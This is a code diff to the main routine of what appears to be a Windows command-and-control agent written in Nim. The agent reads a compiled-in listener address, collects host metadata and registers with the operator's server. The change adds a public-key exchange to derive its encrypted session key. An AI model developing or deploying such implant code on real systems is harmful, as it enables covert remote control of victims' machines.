@@ -1,4 +1,4 @@
-import strformat, os, times, random
+import strformat, os, times, system, base64
 import winim
 
 import core/[task, taskresult, heartbeat, http, register]
@@ -12,10 +12,9 @@ const Octet3 {.intdefine.}: int = 0
 const Octet4 {.intdefine.}: int = 0
 const ListenerPort {.intdefine.}: int = 5555
 const SleepDelay {.intdefine.}: int = 10
+const ServerPublicKey {.strdefine.}: string = ""
 
 proc main() = 
-    randomize()
-
     #[
         The process is the following:
         1. Agent reads configuration file, which contains data relevant to the listener, such as IP, PORT, UUID and sleep settings
@@ -35,14 +34,26 @@ proc main() =
     let address = $Octet1 & "." & $Octet2 & "." & $Octet3 & "." & $Octet4 
 
     # Create agent configuration
-    var config = AgentConfig(
-        agentId: generateUUID(),
-        listenerId: ListenerUuid,
-        ip: address, 
-        port: ListenerPort, 
-        sleep: SleepDelay,
-        sessionKey: generateSessionKey(),   # Generate a new AES256 session key for encrypted communication
-    )
+    var config: AgentConfig
+    try: 
+        let agentKeyPair = generateKeyPair() 
+        let serverPublicKey = decode(ServerPublicKey).toKey() 
+
+        config = AgentConfig(
+            agentId: generateUUID(),
+            listenerId: ListenerUuid,
+            ip: address, 
+            port: ListenerPort, 
+            sleep: SleepDelay,
+            sessionKey: deriveSessionKey(agentKeyPair, serverPublicKey),   # Perform key exchange to derive AES256 session key for encrypted communication
+            agentPublicKey: agentKeyPair.publicKey
+        )
+
+        # Clean up agent's private key from memory
+        zeroMem(agentKeyPair.privateKey[0].addr, sizeof(PrivateKey))
+
+    except CatchableError as err:
+        echo "[-] " & err.msg
 
     # Create registration payload
     var registration: AgentRegistrationData = config.collectAgentMetadata()
